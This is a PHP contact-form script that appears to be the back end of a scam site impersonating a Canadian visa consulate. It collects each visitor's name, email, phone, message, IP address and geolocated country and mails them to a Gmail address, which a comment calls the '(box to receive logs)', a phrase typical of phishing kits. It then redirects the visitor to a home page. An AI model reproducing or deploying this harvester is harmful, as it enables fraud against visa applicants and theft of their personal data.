<?php   
$userIp = $_SERVER['REMOTE_ADDR'];
$ipData = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $userIp));
$userCountry = $ipData->geoplugin_countryName;

date_default_timezone_set('Africa/Lagos');
$dateSubmitted = date('m/d/Y h:i:s a', time());

function getUserOS() { 

	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$os_platform =   "Unknown OS";
	$os_array =   array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ( $os_array as $regex => $value ) { 
		if ( preg_match($regex, $user_agent ) ) {
			$os_platform = $value;
		}
	}   
	return $os_platform;
}

function getUserBrowser() {
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$browser        = "Unknown Browser";
	$browser_array  = array(
		'/msie/i'       =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/mobile/i'     =>  'Handheld Browser'
	);

	foreach ( $browser_array as $regex => $value ) { 
		if ( preg_match( $regex, $user_agent ) ) {
			$browser = $value;
		}
	}
	return $browser;
}
   
if(isset($_POST['email']) && $_POST['fname'] != ''){

 // (box to receive logs)
    $sendTo = "canadavisaconsulate@gmail.com";   
    $body = "";

    $body .= "First Name: " . $_POST['fname'] . "\r\n";
    $body .= "Last Name: " . $_POST['lname'] . "\r\n";
    $body .= "Email: " . $_POST['email'] . "\r\n";
    $body .= "Phone: " . $_POST['phone'] . "\r\n";
    $body .= "Message: " . $_POST['client-msg'] . "\r\n";
    $body .= "IP: " . $userIp . "\r\n";
    $body .= "Country: " . $userCountry . "\r\n";
    $body .= "Date: " . $dateSubmitted . "\r\n";

    $email_send = mail($sendTo, "New Client Contact", $body);

    if ($email_send==true) {
        echo "Message sent successfully...";
    }else {
        echo "Message could not be sent...";
    }

}

sleep(3);

header("Location: home.html");
?>